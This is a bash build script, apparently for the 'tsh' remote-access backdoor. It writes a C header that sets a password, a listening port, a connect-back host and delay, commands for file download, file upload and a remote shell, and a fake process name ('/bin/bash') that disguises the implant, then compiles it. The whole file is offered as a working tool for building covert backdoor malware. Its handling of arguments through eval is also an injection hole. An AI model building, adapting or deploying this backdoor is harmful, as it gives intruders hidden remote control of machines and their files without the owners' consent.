#/bin/bash


# define
SCIPRTNAME="${0##*/}"
PASSWORD="DEFAULT PASSWORD"
BC_HOST="localhost"
BC_PORT=7856
BC_TIME=30

# 
cd "$(dirname "$PWD/$0")"

usage() {
    echo
    echo usage:
    echo $SCIPRTNAME os BC_HOST BC_PORT [PASSWORD] [BC_DELAY]
    echo $SCIPRTNAME os 8.8.8.8 8081
    echo $SCIPRTNAME os 8.8.8.8 8081 mypassword 60
    echo
    make 2>&1 | sed "s/make/$SCIPRTNAME/g"
}

get() {
    if test $2; then
        eval $1=$2
    fi
}

# print usage
if [ $# -lt 3 ]; then
    usage
    exit
fi

# get args
get os       $1
get BC_HOST  $2
get BC_PORT  $3
get PASSWORD $4
get BC_TIME  $5


# write to configuration file
cat > tsh.h <<_EOF
#ifndef _TSH_H
#define _TSH_H

char *secret = "$PASSWORD";

#define SERVER_PORT $BC_PORT

#define CONNECT_BACK_HOST  "$BC_HOST"
#define CONNECT_BACK_DELAY $BC_TIME

#define FAKE_PROC_NAME "/bin/bash"

#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

#endif /* tsh.h */
_EOF


# make file
make $1